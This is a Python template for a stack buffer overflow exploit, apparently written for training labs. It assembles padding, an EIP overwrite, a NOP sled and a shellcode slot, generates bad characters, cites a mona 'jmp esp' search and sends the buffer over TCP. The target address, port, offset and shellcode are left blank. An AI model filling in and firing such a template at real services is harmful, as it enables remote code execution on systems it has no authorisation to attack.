#!/usr/bin/env python3
import socket
import struct

ip = ""
port = 

badchars = b"".join([ struct.pack("<B",x) for x in range(1, 256) ] )

#
# SHELCODE
#

####

prefix = b""

total = 0
offset = 0
overflow = b"A" * offset

pattern = b""
payload = b""
# payload = pattern
# payload = badchars
# payload = buf

#EIP
# !mona jmp -r esp -cpb "\x00"
eip = b""
# eip = b"BBBB"
# eip = struct.pack("<I", 0x62501203)

#nop_sled
nopsled = b""
# padding = b"\x90" * 16

postfix = b"C" * (total - len(prefix) - len(overflow) - len(eip) - len(payload) - len(nopsled) )

buffer = [
  prefix,
  overflow,
  eip,
  nopsled,
  payload,
  postfix
] 
buffer = b"".join(buffer)

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print(f"Sending {len(buffer)} bytes")
    s.connect((ip, port))
    s.send(buffer)
    print("Done!")
except:
  print("Could not connect.")
